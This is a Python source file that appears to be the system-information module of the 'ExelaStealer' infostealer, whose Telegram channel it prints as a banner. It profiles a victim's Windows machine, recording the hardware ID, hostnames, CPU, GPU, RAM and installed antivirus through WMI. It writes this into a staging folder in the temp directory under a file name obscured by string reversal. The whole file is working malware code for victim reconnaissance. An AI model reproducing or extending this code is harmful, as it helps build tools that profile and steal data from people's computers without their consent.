import wmi, subprocess, platform, os, genHwid, time

serialNumber = genHwid.Gen().get_hwid_number() 
name = os.getenv("computername")

class Info:
    def __init__(self) -> None:
        self.variable = "ofni metsyS"[::-1]
        self.path = os.getenv("temp")
        self.filePath = os.path.join(self.path + f"\\{serialNumber}__" + name)
        self.system = platform.system()
        self.pc = subprocess.check_output("wmic csproduct get name").decode('utf-8').split("\n")[1].strip()
        self.hostname = subprocess.check_output("hostname").decode('utf-8').strip()
        self.computername = os.getenv('computername')
        self.cpu = ""
        self.gpu = ""
        self.ram = ""
        self.av = "Unkown"
        self.Run()
        self.createFile()
    def Run(self):
        self.cpu = wmi.WMI().Win32_Processor()[0].Name
        self.gpu = wmi.WMI().Win32_VideoController()[0].Name
        self.ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        self.av = subprocess.check_output(r"WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List").decode().strip().replace("displayName=", "")
    def createFile(self):
        if not os.path.isdir(self.filePath):
            try:
                os.mkdir(self.filePath)
                time.sleep(0.2)
                with open(f"{self.filePath}\\{self.variable}.txt", "a") as f:
                    f.write("---------https://t.me/ExelaStealer---------\n"+ "==================================================\n")
                    f.write(str(f"System : {self.system}\nPC : {self.pc}\n Host : {self.hostname}\n Computer Name : {self.computername}\n"))
                    f.write(str(f"CPU : {self.cpu}\n GPU : {self.gpu}\nRAM {self.ram}\n"))
                    f.write(str(f"Current PC hwid : {serialNumber}\nActive Anti Virüs : {self.av}"))
            except:
                pass
        else:
            try:
               with open(f"{self.filePath}\\{self.variable}.txt", "w") as f:
                    f.write("---------https://t.me/ExelaStealer---------\n"+ "==================================================\n")
                    f.write(str(f"System : {self.system}\nPC : {self.pc}\nHost : {self.hostname}\nComputer Name : {self.computername}\n"))
                    f.write(str(f"CPU : {self.cpu}\nGPU : {self.gpu}\nRAM : {self.ram} GB\n"))
                    f.write(str(f"Current PC hwid : {serialNumber}\nActive Anti Virüs : {self.av}"))
            except:pass
